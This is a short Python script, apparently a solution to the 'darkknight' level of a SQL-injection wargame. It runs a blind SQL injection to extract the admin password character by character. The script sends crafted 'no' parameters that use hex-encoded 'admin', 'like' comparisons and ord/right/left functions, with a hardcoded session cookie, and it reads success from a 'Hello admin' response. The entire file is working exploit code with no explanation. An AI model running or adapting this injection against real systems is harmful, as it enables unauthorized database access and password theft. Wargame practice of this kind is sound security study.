import requests
import string
string.printable

url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
cookies = {
    'PHPSESSID' : 'nui79padnqo9dshj9fl9m5ani3'
}
params = {
    'no' : None
}

for i in range(5,9):
    payload= "123|| (id like 0x61646d696e && length(pw)like({}))#".format(i)
    params['no'] = payload
    response = requests.get(url,params=params,cookies=cookies)
    if("Hello admin" in response.text):
        print(params)


answer = ''
for i in range(1,9):
    for j in string.printable:
        payload = "123|| (id like 0x61646d696e && ord(right(left(pw,{0}),1)) like {1})#".format(i,ord(j))
        params['no'] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello admin" in response.text):
            answer +=j
            print(payload)
            break

print(answer)